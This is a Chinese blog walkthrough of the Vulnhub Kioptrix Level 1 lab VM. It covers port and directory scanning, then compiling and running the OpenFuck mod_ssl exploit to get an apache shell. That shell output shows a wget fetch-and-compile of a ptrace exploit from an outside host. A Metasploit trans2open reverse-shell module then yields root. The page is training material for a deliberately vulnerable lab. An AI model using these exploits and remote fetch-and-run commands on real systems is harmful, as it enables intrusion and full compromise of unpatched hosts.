@@ -1,0 +1,790 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Vulnhub - Kioptrix Level 1 靶场实战 | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Vulnhub">
+    <meta name="description" content="靶场信息This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games ar">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub - Kioptrix Level 1 靶场实战">
+<meta property="og:url" content="http://www.lucifiel.com/2021/11/13/Kioptrix/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="靶场信息This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games ar">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2021/11/13/Kioptrix/image1.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/11/13/Kioptrix/image2.png">
+<meta property="article:published_time" content="2021-11-13T00:36:20.000Z">
+<meta property="article:modified_time" content="2023-05-19T09:05:52.632Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2021/11/13/Kioptrix/image1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Vulnhub - Kioptrix Level 1 靶场实战</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Vulnhub - Kioptrix Level 1 靶场实战</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-11-13T00:36:20.000Z" itemprop="datePublished" class="page-time">
+  2021-11-13
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-number">2.</span> <span class="post-toc-text">信息搜集</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-number">3.</span> <span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#权限提升"><span class="post-toc-number">4.</span> <span class="post-toc-text">权限提升</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Kioptrix"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Vulnhub - Kioptrix Level 1 靶场实战</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-11-13 08:36:20" datetime="2021-11-13T00:36:20.000Z"  itemprop="datePublished">2021-11-13</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h2 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h2><pre><code>This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.
+这个Kioptrix VM Image是很容易的挑战。游戏的目的是通过任何可能的手段获得root权限（除了实际入侵VM服务器或玩家）。这些游戏的目的是学习漏洞评估和利用方面的基本工具和技术。成功完成这些挑战的方法有很多。
+</code></pre>
+<pre><code>下载地址
+https://www.vulnhub.com/entry/kioptrix-level-1-1,22/
+</code></pre>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>首先使用arp获取靶机的IP地址</p>
+<pre><code>┌──(root💀kali)-[~/Desktop]
+└─# arp-scan -l
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:5d:2e:77, IPv4: 192.168.1.106
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.1.102   00:0c:29:55:cb:15       VMware, Inc.
+
+9 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 2.135 seconds (119.91 hosts/sec). 7 responded
+</code></pre>
+<p>确定靶机IP地址为192.168.1.102，使用nmap进行端口扫描</p>
+<pre><code>┌──(root💀kali)-[~/Desktop]
+└─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.1.102
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-12 07:47 EST
+Nmap scan report for 192.168.1.102
+Host is up (0.00042s latency).
+Not shown: 65529 closed ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
+| ssh-hostkey:
+|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
+|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
+|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
+|_sshv1: Server supports SSHv1
+80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-title: Test Page for the Apache Web Server on Red Hat Linux
+111/tcp  open  rpcbind     2 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2            111/tcp   rpcbind
+|   100000  2            111/udp   rpcbind
+|   100024  1           1024/tcp   status
+|_  100024  1           1024/udp   status
+139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
+443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-title: 400 Bad Request
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2009-09-26T09:32:06
+|_Not valid after:  2010-09-26T09:32:06
+|_ssl-date: 2021-11-12T13:50:26+00:00; +1h01m55s from scanner time.
+| sslv2:
+|   SSLv2 supported
+|   ciphers:
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_64_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|_    SSL2_DES_64_CBC_WITH_MD5
+1024/tcp open  status      1 (RPC #100024)
+MAC Address: 00:0C:29:55:CB:15 (VMware)
+Device type: general purpose
+Running: Linux 2.4.X
+OS CPE: cpe:/o:linux:linux_kernel:2.4
+OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
+Network Distance: 1 hop
+
+Host script results:
+|_clock-skew: 1h01m54s
+|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.42 ms 192.168.1.102
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 69.83 seconds
+</code></pre>
+<p>这东西稍微的有点多，一个个看</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/11/13/Kioptrix/image1.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>80端口好像也没啥可看的？扫个目录看看吧</p>
+<pre><code>┌──(root💀kali)-[~/Desktop]
+└─# gobuster dir -w /usr/share/dirb/wordlists/common.txt -x .php -e -t 200 -u http://192.168.1.102/
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.1.102/
+[+] Method:                  GET
+[+] Threads:                 200
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2021/11/12 07:52:42 Starting gobuster in directory enumeration mode
+===============================================================
+http://192.168.1.102/.htaccess            (Status: 403) [Size: 273]
+http://192.168.1.102/.htpasswd            (Status: 403) [Size: 273]
+http://192.168.1.102/.hta                 (Status: 403) [Size: 268]
+http://192.168.1.102/.htaccess.php        (Status: 403) [Size: 277]
+http://192.168.1.102/.htpasswd.php        (Status: 403) [Size: 277]
+http://192.168.1.102/.hta.php             (Status: 403) [Size: 272]
+http://192.168.1.102/~root                (Status: 403) [Size: 269]
+http://192.168.1.102/~operator            (Status: 403) [Size: 273]
+http://192.168.1.102/cgi-bin/             (Status: 403) [Size: 272]
+http://192.168.1.102/index.html           (Status: 200) [Size: 2890]
+http://192.168.1.102/manual               (Status: 301) [Size: 294] [--&gt; http://127.0.0.1/manual/]
+http://192.168.1.102/mrtg                 (Status: 301) [Size: 292] [--&gt; http://127.0.0.1/mrtg/]
+http://192.168.1.102/usage                (Status: 301) [Size: 293] [--&gt; http://127.0.0.1/usage/]
+http://192.168.1.102/test.php             (Status: 200) [Size: 27]
+</code></pre>
+<p>挨个去看看</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/11/13/Kioptrix/image2.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>几个页面都会跳转到127.0.0.1，只有test.php可以访问，而且还没什么东西</p>
+<p>继续回到端口看看吧</p>
+<pre><code>┌──(root💀kali)-[~/Desktop]
+└─# smbclient -L 192.168.1.102                                                                                                            1 ⨯
+protocol negotiation failed: NT_STATUS_IO_TIMEOUT
+</code></pre>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>看到80端口后面的mod_ssl&#x2F;2.8.4，去搜一下有没有Exploit</p>
+<pre><code>┌──(root💀kali)-[~/Desktop]
+└─# searchsploit mod_ssl
+------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                              |  Path
+------------------------------------------------------------------------------------------------------------ ---------------------------------
+Apache mod_ssl 2.0.x - Remote Denial of Service                                                             | linux/dos/24590.txt
+Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                                  | multiple/dos/21575.txt
+Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuck.c&#39; Remote Buffer Overflow                                        | unix/remote/21671.c
+Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuckV2.c&#39; Remote Buffer Overflow (1)                                  | unix/remote/764.c
+Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuckV2.c&#39; Remote Buffer Overflow (2)                                  | unix/remote/47080.c
+Apache mod_ssl OpenSSL &lt; 0.9.6d / &lt; 0.9.7-beta2 - &#39;openssl-too-open.c&#39; SSL2 KEY_ARG Overflow                | unix/remote/40347.txt
+------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+</code></pre>
+<p>对比mod_ssl&#x2F;2.8.4版本，有三个版本合适，挨个进行测试</p>
+<p>经过测试发现unix&#x2F;remote&#x2F;47080.c是可以使用的，咱们给他复制出来</p>
+<pre><code>┌──(root💀kali)-[~/Desktop]
+└─# locate unix/remote/47080.c
+/usr/share/exploitdb/exploits/unix/remote/47080.c
+
+┌──(root💀kali)-[~/Desktop]
+└─# cp /usr/share/exploitdb/exploits/unix/remote/47080.c ./
+</code></pre>
+<p>然后使用gcc进行编译</p>
+<pre><code>┌──(root💀kali)-[~/Desktop]
+└─# gcc -o exploit 47080.c -lcrypto
+47080.c:21:10: fatal error: openssl/ssl.h: 没有那个文件或目录
+   21 | #include &lt;openssl/ssl.h&gt;
+      |          ^~~~~~~~~~~~~~~
+compilation terminated.
+</code></pre>
+<p>提示报错了，经过百度搜索，发现是缺少了组件</p>
+<p>咱们使用apt进行安装</p>
+<pre><code>┌──(root💀kali)-[~/Desktop]
+└─# apt-get install libssl1.0-dev
+</code></pre>
+<p>然后再进行编译</p>
+<pre><code>┌──(root💀kali)-[~/Desktop]
+└─# gcc -o exploit 47080.c -lcrypto
+
+┌──(root💀kali)-[~/Desktop]
+└─# ls
+47080.c  exploit
+</code></pre>
+<p>去运行一下</p>
+<pre><code>┌──(root💀kali)-[~/Desktop]
+└─# ./exploit
+
+*******************************************************************
+* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+: Usage: ./exploit target box [port] [-c N]
+
+  target - supported box eg: 0x00
+  box - hostname or IP address
+  port - port for ssl connection
+  -c open N connections. (use range 40-50 if u dont know)
+</code></pre>
+<p>运行后得到了运行参数，咱们还得先找到对应的版本</p>
+<pre><code>┌──(root💀kali)-[~/Desktop]
+└─# ./exploit | grep apache-1.3.20                                                                                                        1 ⨯
+        0x02 - Cobalt Sun 6.0 (apache-1.3.20)
+        0x27 - FreeBSD (apache-1.3.20)
+        0x28 - FreeBSD (apache-1.3.20)
+        0x29 - FreeBSD (apache-1.3.20+2.8.4)
+        0x2a - FreeBSD (apache-1.3.20_1)
+        0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)
+        0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)
+        0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)
+        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
+        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
+        0x7e - Slackware Linux 8.0 (apache-1.3.20)
+        0x86 - SuSE Linux 7.3 (apache-1.3.20)
+</code></pre>
+<p>符合条件的有两个，分别是0x6a和0x6b，分别去测试一下</p>
+<pre><code>┌──(root💀kali)-[~/Desktop]
+└─# ./exploit 0x6a 192.168.1.102 -c 40
+
+*******************************************************************
+* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+Connection... 40 of 40
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80f8070
+Ready to send shellcode
+Spawning shell...
+Good Bye!
+</code></pre>
+<p>0x6a测试失败，现在去测试一下0x6b</p>
+<pre><code>┌──(root💀kali)-[~/Desktop]
+└─# ./exploit 0x6b 192.168.1.102 -c 40
+
+*******************************************************************
+* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+Connection... 40 of 40
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80f81e8
+Ready to send shellcode
+Spawning shell...
+bash: no job control in this shell
+bash-2.05$
+d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo
+--09:32:52--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+           =&gt; `ptrace-kmod.c&#39;
+Connecting to dl.packetstormsecurity.net:443... connected!
+
+Unable to establish SSL connection.
+
+Unable to establish SSL connection.
+gcc: ptrace-kmod.c: No such file or directory
+gcc: No input files
+rm: cannot remove `ptrace-kmod.c&#39;: No such file or directory
+bash: ./exploit: No such file or directory
+bash-2.05$
+bash-2.05$ whoami&amp;&amp;id
+whoami&amp;&amp;id
+apache
+uid=48(apache) gid=48(apache) groups=48(apache)
+</code></pre>
+<p>0x6b成功getshell，现在去提权</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>经过测试后没有发现提权的点，但是发现了另一种root权限的方法，那就是用msf的模块</p>
+<pre><code>use exploit/linux/samba/trans2open
+set payload linux/x86/shell_reverse_tcp
+show options
+set rhosts 192.168.1.102
+exploit
+
+msf6 exploit(linux/samba/trans2open) &gt; exploit
+
+[*] Started reverse TCP handler on 192.168.1.106:4444
+[*] 192.168.1.102:139 - Trying return address 0xbffffdfc...
+[*] 192.168.1.102:139 - Trying return address 0xbffffcfc...
+[*] 192.168.1.102:139 - Trying return address 0xbffffbfc...
+[*] 192.168.1.102:139 - Trying return address 0xbffffafc...
+[*] 192.168.1.102:139 - Trying return address 0xbffff9fc...
+[*] 192.168.1.102:139 - Trying return address 0xbffff8fc...
+[*] Command shell session 1 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1036) at 2021-11-13 07:04:24 -0500
+
+[*] Command shell session 2 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1037) at 2021-11-13 07:04:25 -0500
+[*] Command shell session 3 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1038) at 2021-11-13 07:04:26 -0500
+whoami&amp;&amp;id
+root
+uid=0(root) gid=0(root) groups=99(nobody)
+</code></pre>
+<p>用msf的模块打就是root，至于为啥我也没研究出个所以然来（主要因为菜）</p>
+<p>知道原因的小伙伴可以告诉我一下</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/11/13/Kioptrix/&title=《Vulnhub - Kioptrix Level 1 靶场实战》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/11/13/Kioptrix/&title=《Vulnhub - Kioptrix Level 1 靶场实战》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/11/13/Kioptrix/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Vulnhub - Kioptrix Level 1 靶场实战》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/11/13/Kioptrix/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/11/13/Kioptrix/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/05/05/Overpass/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">TryHackMe - Overpass 靶场实战</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2021/10/17/Chill_Hack/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Vulnhub - Chill_Hack 靶场实战</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: '',
+          clientSecret: '',
+          repo: '',
+          owner: '',
+          admin: [''],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/false" alt="打赏二维码">
+        </div>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/11/13/Kioptrix/&title=《Vulnhub - Kioptrix Level 1 靶场实战》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/11/13/Kioptrix/&title=《Vulnhub - Kioptrix Level 1 靶场实战》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/11/13/Kioptrix/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Vulnhub - Kioptrix Level 1 靶场实战》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/11/13/Kioptrix/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/11/13/Kioptrix/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
